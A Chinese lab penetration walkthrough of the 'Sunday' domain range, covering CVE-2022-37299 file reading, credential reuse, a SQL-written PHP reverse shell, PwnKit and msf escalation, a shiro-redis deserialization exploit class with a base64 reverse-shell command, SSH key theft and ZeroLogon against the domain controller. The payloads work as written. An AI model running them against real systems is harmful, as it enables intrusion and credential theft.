#  攻防 | 域渗透之Sunday   
 渗透安全团队   2023-11-28 23:17  
  
原文首发在：先知社区  
  
https://xz.aliyun.com/t/12971  
# 环境搭建：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicUaDRQHQIllibXNQFKFCpIqqXSeLuggypy6OQxCkLg8JErW5nV0t5POA/640?wx_fmt=png&from=appmsg "")  
## 搭建过程：  
  
首先去配置web的网卡：ip为192.168.10.175  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYiciclxeHICxxUqSice51tm0nvBMvqnjRQ9GM5zByW7siadeVyiaXWibWVQbXA/640?wx_fmt=png&from=appmsg "")  
  
web123：ip为192.168.10.174  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicm30qdxCjsuWxZdXCwxXhHjHlWmSCmjmvM3SlElqJHt7zTMnXZy70mg/640?wx_fmt=png&from=appmsg "")  
  
在pc1上配置双网卡。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicAq6WE5lX2mqE2zn3fxfjwtlrEGMDByE8nibDA3Hnnz6jtuPPQdb5Nnw/640?wx_fmt=png&from=appmsg "")  
  
在ad2012上配置网段信息为10段  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicFJbbouRWd8qz4HaQHib8E78XVvhLsdNtBebx1hhSvoFZeMoq2KZCnSw/640?wx_fmt=png&from=appmsg "")  
  
配置域控ad12为10.10.10.137  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicuvBTTLfT0mmhO0PBbKCx6fiaXVTibM3WRwTPMsadic2G0MyTrrnmsbrBw/640?wx_fmt=png&from=appmsg "")  
# web打点  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicASVNjce3pq8ibyYLOwKH7WEkRf31Km6p9WvUPU9QemN69NP3qM9dnibQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYiceHO7hQa93TxbqhLR8sHPdbyk0HOAck2D6F4n5Xh1FTjyhCbM62pmkw/640?wx_fmt=png&from=appmsg "")  
## 信息收集  
  
访问192.168.10.174.发现该cms为ShirneCMS  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicwlYBpO3BpymoO7G7ApGUomswxFHWGj1tNDc9XVRp1nusjk7WYoGmoQ/640?wx_fmt=png&from=appmsg "")  
## 端口扫描  
  
发现其开放了80端口和22端口。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYiclicEicPibRGJLTbibQy8OnUTib3rD9j2K80jOfxq09bSEHKFNVLpsVr60RQ/640?wx_fmt=png&from=appmsg "")  
## CVE-2022-37299  
### 漏洞原理：  
  
在ueditor编辑器中 file_get_contents没有传⼊的参数进⾏过滤 导致可以使⽤伪协议读取⽂件  
### 代码分析：  
  
在文件中，作者添加了导致路径遍历问题的代理函数，并且可以读取安装了CMS的系统上的任何文件。  
/static/ueditor/php/controller.php  
```
if(strlen($data) > 100){
 header("Content-type: image/jpeg");
 if($maxwidth > 0){
 $image = imagecreatefromstring($data);
 if($image){
 $width = imagesx($image);
 $height = imagesy($image);
 $sw=0;
 if($width > $height){
 if($width > $maxwidth){
 $sw = $maxwidth;
 $sh = $height * $sw / $width;
 }
 }else{
 if($height > $maxwidth){
 $sh = $maxwidth;
 $sw = $width * $sh / $height;
 }
 }
 if($sw > 0){
 $newimage = imagecreatetruecolor($sw,$sh);
 imagecopyresampled($newimage, $image, 0, 0, 0, 0, $sw, $sh,
$width, $height);
 
 imagejpeg($newimage,null,70);
 imagedestroy($newimage);
 }else{
 imagejpeg($image,null,70);
 }
 imagedestroy($image);
 }
 }else{
 echo $data;
 }
}
```  
  
CVE漏洞搜索发现其存在目录遍历漏洞  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicarF8gD8HHHkM2VTxfahzdc9gLDHPENGVrllZRJscVNPEocyXS5fc4g/640?wx_fmt=png&from=appmsg "")  
  
然后利用其来读取配置文件。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicgCg5eNXGltRHGpr3fe6TXanouXj8dnh6FVT13cKd7hma5zJZWlbYvg/640?wx_fmt=png&from=appmsg "")  
  
使用base64进行解码。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicg4yDjDfibL2oJYXhTXVqlsEkqJ94T11Roh9QgMcTiaibaz3OzK7aSicJjw/640?wx_fmt=png&from=appmsg "")  
  
成功解密用户名和密码。  
```
<?php
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006~2018 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: liu21st <liu21st@gmail.com>
// +----------------------------------------------------------------------

return [
    // 数据库类型
    'type'            => 'mysql',
    // 服务器地址
    'hostname'        => 'localhost',
    // 数据库名
    'database'        => 'cms',
    // 用户名
    'username'        => 'root',
    // 密码
    'password'        => 'vVICDU1Erw',
    // 端口
    'hostport'        => '',
    // 连接dsn
    'dsn'             => '',
    // 数据库连接参数
    'params'          => [],
    // 数据库编码默认采用utf8
    'charset'         => 'utf8mb4',
    // 数据库表前缀
    'prefix'          => 'sa_',
    // 数据库调试模式
    'debug'           => true,
    // 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器)
    'deploy'          => 0,
    // 数据库读写是否分离 主从式有效
    'rw_separate'     => false,
    // 读写分离后 主服务器数量
    'master_num'      => 1,
    // 指定从服务器序号
    'slave_no'        => '',
    // 自动读取主库数据
    'read_master'     => false,
    // 是否严格检查字段是否存在
    'fields_strict'   => true,
    // 数据集返回类型
    'resultset_type'  => 'array',
    // 自动写入时间戳字段
    'auto_timestamp'  => false,
    // 时间字段取出后的默认时间格式
    'datetime_format' => false,
    // 是否需要进行SQL性能分析
    'sql_explain'     => false,
    // Builder类
    'builder'         => '',
    // Query类
    'query'           => '\\think\\db\\Query',
    // 是否需要断线重连
    'break_reconnect' => false,
    // 断线标识字符串
    'break_match_str' => [],
];

```  
## 登录phpadmin  
  
使用解密出的用户名和密码进行登录。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYic0V9llsyynSOke4HaTrQfVGOYkzk0t2UArmsJAqiay8U2K1WamicpnmVA/640?wx_fmt=png&from=appmsg "")  
  
读取/etc/password。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYic2NjNWdhSXQN9l87NvObbk4mx0yrG2tTXdTP0L3ZcM48sxJucTgAhrw/640?wx_fmt=png&from=appmsg "")  
## 查找用户名和密码  
  
在数据库中，发现系统登录用户名和密码。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicQfJftXGMeKKhdVI7tkwZAJhlljdL8ngRB1WDrZQuibdGQ0wFnia3kd7w/640?wx_fmt=png&from=appmsg "")  
  
使用admin 1lovehackers进行登录。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYic8WappJx8ySPRicAfFmCib8B2xvibartSTULl1STowgiaMSfWKXhA5B4EvQ/640?wx_fmt=png&from=appmsg "")  
## 获取webshell  
  
首先去尝试写入phpinfo  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicn9dibqRibibneoOLZPy09k1FQWtoHoibOPwYeFTMmyNA74JK5OQha0ImTQ/640?wx_fmt=png&from=appmsg "")  
### 文件包含漏洞  
  
然后在添加分类当中使用目录遍历写入tmp文件。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYic4JHWcvDNvPqibibPVWoZZmv5llTv0Ng9GPVBS35hIBIuVpbyicvDOFDeg/640?wx_fmt=png&from=appmsg "")  
  
写入payload，然后保存，进行反弹shell。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicIf6Mah9cDdbic2DHnDzpRZTEHpPkw5BTSk2S1WW4EXbckD6iaFAuSoxQ/640?wx_fmt=png&from=appmsg "")  
### 反弹shell  
  
使用nc进行反弹shell。  
```
select '<?php system("bash -c \'bash -i >& /dev/tcp/192.168.10.128/2333 0>&1\'"); ?>' into outfile '/tmp/view.tpl'
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYic983A9L5q5wJV9FdrhfwcHnwTxbwtfdBVNBc3L4cLajlOsHBibo3giatw/640?wx_fmt=png&from=appmsg "")  
# 内网渗透  
## 权限提升  
  
发现   
是ubuntu16.04 版本 ，  
  
提权exp ：https://github.com/luijait/PwnKit-Exploit  
  
使用wget进行下载。  
```
wget 192.168.10.128/home/kali/PwnKit-Exploit-main/exploit.c
```  
  
然后发现没有提权成功。  
### msf提权  
  
接着使用msf进行权限提升  
  
设置监听  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYiceggcyGbmH6yv1ycKBT07KYJIfoPw7CzuKrlibs4VQhCBv4Q5UTQsDmg/640?wx_fmt=png&from=appmsg "")  
  
使用explot模块。然后进行提权。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicrUoONGarZlEMAK5EbrD0MBTODBjnQtFaaUvaSVG12vHjjib2k7vibDGA/640?wx_fmt=png&from=appmsg "")  
  
成功获取root权限。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYic9793BwMxQD4BMv9jibQLJlRbjf8F3WCmVowCfzPoeG17GnEU9guXAbw/640?wx_fmt=png&from=appmsg "")  
  
然后接着查看路由信息。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYica4OjL7rRkGD9VNGRdkDKiby33FZRHXeQLHzO3DmpzXOqsnsHXiaHnxNQ/640?wx_fmt=png&from=appmsg "")  
## 搭建代理  
  
使用frp+msf进行隧道搭建。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYic3jnicicric4uJ85MIRsicS2Yia9cW4loibic3LdQ4TxIuQCBuoxuVzpyZuGsQ/640?wx_fmt=png&from=appmsg "")  
  
设置代理地址。![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYic0oEcv9ZAnjxfG2y4ufIRN3Iqszpc5kkvfH1LlpTl02qTvRrXulkKjw/640?wx_fmt=png&from=appmsg "")  
  
## 内网信息收集  
### fscan扫描  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYiczicv3KiartSzH3EPmnm8E07BDazefsrkvRW4hsGunlDnZOkWyLQXe8Sw/640?wx_fmt=png&from=appmsg "")  
  
使用nmap进行扫描，发现存在6379和8080端口开放。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYic1kG89ggmj9iaSfwzETXCxts0KuOJR23nvFibibmRBSHYzZJv7Icgr5RaQ/640?wx_fmt=png&from=appmsg "")  
  
访问8080端口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicASVNjce3pq8ibyYLOwKH7WEkRf31Km6p9WvUPU9QemN69NP3qM9dnibQ/640?wx_fmt=png&from=appmsg "")  
### redis未授权访问密码爆破  
  
爆破redis密码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicG8XgRtYBVdsmXDdKjzqlE6GgdcibECICAujlt1tzkboMvrc0f71nrVQ/640?wx_fmt=png&from=appmsg "")  
  
成功登录。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicXbnorXQTIJ4cSGUCEEiaoibykHVdMzne9HkM2gf3zFLNzwv4Lta5YRFw/640?wx_fmt=png&from=appmsg "")  
  
访问8080端口，使用默认密码登录。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYiccbwiabBK8porX41UMoJR8ku1O2YZFIpyxPwvBMa3r1rsich1tkW0tbdw/640?wx_fmt=png&from=appmsg "")  
## Java代码审计：  
### shiro redis 反序列化  
  
通过搜索引擎找到此源码 https://github.com/alexxiyang/shiro-redis-spring-tutorial  
  
下载到本地⽤idea开分析  
  
org/crazycake/shiro/serializer/ObjectSerializer.java  
```
@Override
public Object deserialize(byte[] bytes) throws SerializationException
{
Object result = null;
if (bytes == null || bytes.length == 0) {
return result;
}
try {
ByteArrayInputStream byteStream = new ByteArrayInputStream(byt
es);
ObjectInputStream objectInputStream = new MultiClassLoaderObje
ctInputStream(byteStream);
result = objectInputStream.readObject();
} catch (IOException e) {
throw new SerializationException("deserialize error", e);
} catch (ClassNotFoundException e) {
throw new SerializationException("deserialize error", e);
}
return result;
```  
  
这⾥存在反序列化，发现deserialize被get调⽤  
  
org/crazycake/shiro/RedisCache.java  
```
@Override
public V get(K key) throws CacheException {
logger.debug("get key [" + key + "]");
if (key == null) {
return null;
}
try {
Object redisCacheKey = getRedisCacheKey(key);
byte[] rawValue = redisManager.get(keySerializer.serialize(redisCach
eKey));
if (rawValue == null) {
return null;
}
V value = (V) valueSerializer.deserialize(rawValue);
return value;
} catch (SerializationException e) {
throw new CacheException(e);
}
}
```  
  
在获取缓存的时候调⽤反序列化还原对象，查看redis缓存内容是反序列化格式。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYic4yMQU6p9yhN0AH6iaPpOPNW05ydugzpHibsoxdgib4qiaM7jOzu6e4TXmQ/640?wx_fmt=png&from=appmsg "")  
  
从依赖中看到 cb  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicl6kvsDXMlicBMrrZ7180rdUAfAibJJYxvWYrtbfO9QMo5HXuH4UOLWQQ/640?wx_fmt=png&from=appmsg "")  
### exp编写  
```
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
public class Evil extends AbstractTranslet {
public void transform(DOM document, SerializationHandler[] handlers) t
hrows TransletException {}
public void transform(DOM document, DTMAxisIterator iterator, Serializ
ationHandler handler) throws TransletException {}
public Evil() throws Exception {
Process p = null;
try {
Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+Ji9kZXYvd
GNwLzEwMy4xNDguMjQ0LjE1MS84ODc3IDA+JjE=}|{base64,-d}|{bash,-i}");
p.waitFor();
} catch (Exception e) {
e.printStackTrace();
}
}
}
```  
  
在redisdb中写入session  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicWNVjxzQic7qlFNtwzJkwwlGz30pia5ZTyhwvrBgsplQIAN2vNa4DuQ6g/640?wx_fmt=png&from=appmsg "")  
  
然后使用bash进行反弹shell。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYiccwBrGEL0qDjpc7uY6MXlG2AUHrUXyicYrysdjlSEMX5UAl5geViaymGw/640?wx_fmt=png&from=appmsg "")  
  
发现成功写入了key。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicgHsJdKibes8Ght3dQpUQFsavIp8ibLfvNuB55sicKSpia9iaibcKib3jSict2w/640?wx_fmt=png&from=appmsg "")  
  
然后抓包去触发。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicHIiaBeYnc9vqqfvR8kSiazpicVicWDrNicmdFeOOMYRLeGarhp5g5R5j7pQ/640?wx_fmt=png&from=appmsg "")  
## msf上线  
  
上传msf的木马，接着进行上线  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYic79jPxIsXe1wa5RUhTFVMWj5QJW1Oucme5RQ0GpxFWSRtiboP87qCsBQ/640?wx_fmt=png&from=appmsg "")  
  
成功上线。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYiclFSDPo78kZ9fI0sBHREVTK6PMIhxyuia1tnogdBMXWWuNrkckuMZQIw/640?wx_fmt=png&from=appmsg "")  
  
发现root.txt。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicbloOT3AnEnQrDicWOhE262JBV9T0NRjHTOJ3RPUC3vqSlgRY8RoZfDA/640?wx_fmt=png&from=appmsg "")  
## 文件搜索  
  
翻文件翻到存在id_rsa  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicXC2JRwnwicJK1VZiabqIECDgDgbgGMWIhWX0VZ6JwQw7mgaZxWkjnPOQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYic321nhTevMsrumicDAuhMibNmoF2NCQ6Nh52CbA41iciaK3pm6LsPiaEnk5A/640?wx_fmt=png&from=appmsg "")  
## 横向PC1主机  
  
使用ssh进行连接。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicLiabHr9qbQ8T2OEkiar0rtz9uVxnVzrF1RlRlf0iaGbwaHeaFwXJiaf1nQ/640?wx_fmt=png&from=appmsg "")  
  
添加权限之后，成功进行连接。获取到另一个root.txt.  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYic86T45KXlK04sHGtn6tuyicl3Up3ACNM6fibjPcTMMIELvrCkTTsbtbRw/640?wx_fmt=png&from=appmsg "")  
  
发现其为双网卡机器。判断其存在域环境。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicmqgorUWxNcib3ibaGmDQLgXL7z6PCIHPhZhbdu6TXND4GSRuCPasnd8g/640?wx_fmt=png&from=appmsg "")  
# 域渗透  
  
使用fscan进行扫描，发现其存在域控。  
  
域控ip为：10.10.10.133  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicJSu2ibulJsLFMejvRUB5QcQn2s3RibwGOYS15LImK6RzIAHOjDNvXdWw/640?wx_fmt=png&from=appmsg "")  
## 获取域控权限  
## ZeroLogon(CVE-2020-1472) 提权域控  
  
发现该主机存在ZeroLogon置空漏洞。  
  
使用脚本进行域控密码置空。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicQVCBk0VCBqCcr5uIEYiaHmsoMXibP5mmlGrNdZrEo26phwfrLE8nEy9w/640?wx_fmt=png&from=appmsg "")  
  
获取管理员hahsh  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicePaYYunnO7oOo65x5W8mXWEaFEbfIIXKjRTL8CAoIDibg0Iw2I1OUAg/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicuw9QEgcRx366eiciast5A3hxIVwjAsAIGfc0LQmwiaJNoAnt3z9oG3KgA/640?wx_fmt=png&from=appmsg "")  
## wmiexec横向移动  
  
使用wmiexec进行横向移动到域控。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYicMZj9MJLEEOLPqsxicoSYAwia3ORJXXb8ggmVnLojEzwaxdQEGTAVlzKA/640?wx_fmt=png&from=appmsg "")  
  
接着使用wmiexec进行横向移动到exchange主机。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrm8HI98MfRPDRicQqEtIxYiczeeWmPUE6aibAhhtau3kI9NcR96JPkuLQ0ib6bHYFgJy5vRhBLDCryQA/640?wx_fmt=png&from=appmsg "")  
  
  
**★**  
  
**付费圈子**  
  
  
**欢 迎 加 入 星 球 ！**  
  
**代码审计+免杀+渗透学习资源+各种资料文档+各种工具+付费会员**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.4447566002908574&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**进成员内部群**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/pPVXCo8Wd8AQHAyOTgM5sLrvP6qiboXljGWG0uOdvcNR8Qw5QJLxSVrbFds2j7MxExOz1ozb9ZoYwR68leoLdAg/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.09738205945672873&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**星球的最近主题和星球内部工具一些展示******  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/pPVXCo8Wd8Doq0iczyRiaBfhTQyfzqSGuia4lfHfazabEKr2EDe7sGVoxUhLrNRA4FbI1yef6IkWdmzxvZrTiaJncg/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8BmE6FAA8Bq7H9GZIRt1xYZpmYNWxrrzolt71FtX5HyM03H0cxkiaYelv7ZSajLtibEdBXUpCibdItXw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8ADSxxicsBmvhX9yBIPibyJTWnDpqropKaIKtZQE3B9ZpgttJuibibCht1jXkNY7tUhLxJRdU6gibnrn0w/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8DKZcqe8mOKY1OQN5yfOaD5MpGk0JkyWcDKZvqqTWL0YKO6fmC56kSpcKicxEjK0cCu8fG3mLFLeEg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8CKksEIzZyEb3tEFGzGYSXfribrG4jKOkRKGKYb7zk7MTNZPT6Wp3bLd2BPhuFHddIL6sqrg1d2qHQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8D0bS8ibc3XhFcDYkVusFvc3c6onthQpPGZn4v32rpOp7CeFiamGdeC7JBk0mGVsiciazLp3z0SIJAtnQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8B96heXWOIseicx7lYZcN8KRN8xTiaOibRiaHVP4weL4mxd0gyaWSuTIVJhBRdBmWXjibmcfes6qR1w49w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8DKZcqe8mOKY1OQN5yfOaD5MpGk0JkyWcDKZvqqTWL0YKO6fmC56kSpcKicxEjK0cCu8fG3mLFLeEg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8AqNwoQuOBy9yePOpO5Kr6aHIxj7d0ibfAuPx9fAempAoH9JfIgX4nKzCwDyhQzPrRIx4upyw5yT4Q/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
****  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.4447566002908574&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**加入安全交流群**  
  
  

								[                ](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489372&idx=1&sn=5e14ba5fa59059fb1ee405e56ef90d40&chksm=c175eaf3f60263e5ef5415a8a9fc134f0890fdb9c25ab956116d17109baf98b3bd6bed572a2d&scene=21#wechat_redirect)  

			                  
  
  
**关 注 有 礼**  
  
  
  
关注下方公众号回复“  
666  
”可以领取一套领取黑客成长秘籍  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
 还在等什么？赶紧点击下方名片关注学习吧！![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
**推荐阅读**  
  
  
  
[干货｜史上最全一句话木马](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489259&idx=1&sn=b268701409ad4e8785cd5ebc23176fc8&chksm=c175eb44f60262527120100bd353b3316948928bd7f44cf9b6a49f89d5ffafad88c6f1522226&scene=21#wechat_redirect)  
  
  
  
[干货 | CS绕过vultr特征检测修改算法](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247486980&idx=1&sn=6d65ae57f03bd32fddb37d7055e5ac8e&chksm=c175f3abf6027abdad06009b2fe964e79f2ca60701ae806b451c18845c656c12b9948670dcbc&scene=21#wechat_redirect)  
  
  
  
[实战 | 用中国人写的红队服务器搞一次内网穿透练习](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247488628&idx=1&sn=ff2c617cccc00fe262ed9610c790fe0e&chksm=c175e9dbf60260cd0e67439304c822d28d510f1e332867e78a07d631ab27143309d14e27e53f&scene=21#wechat_redirect)  
  
  
  
[实战 | 渗透某培训平台经历](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247488613&idx=1&sn=12884f3d196ac4f5c262a587590d516d&chksm=c175e9caf60260dcc0d5d81a560025d548c61fda975d02237d344fd79adc77ac592e7e562939&scene=21#wechat_redirect)  
  
  
  
[实战 | 一次曲折的钓鱼溯源反制](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489278&idx=1&sn=5347fdbf7bbeb3fd37865e191163763f&chksm=c175eb51f602624777fb84e7928bb4fa45c30f35e27f3d66fc563ed97fa3c16ff06d172b868c&scene=21#wechat_redirect)  
  
  
  
**免责声明**  
  
由于传播、利用本公众号渗透安全团队所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号渗透安全团队及作者不为**此**  
承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
好文分享收藏赞一下最美点在看哦  
##   
  
  
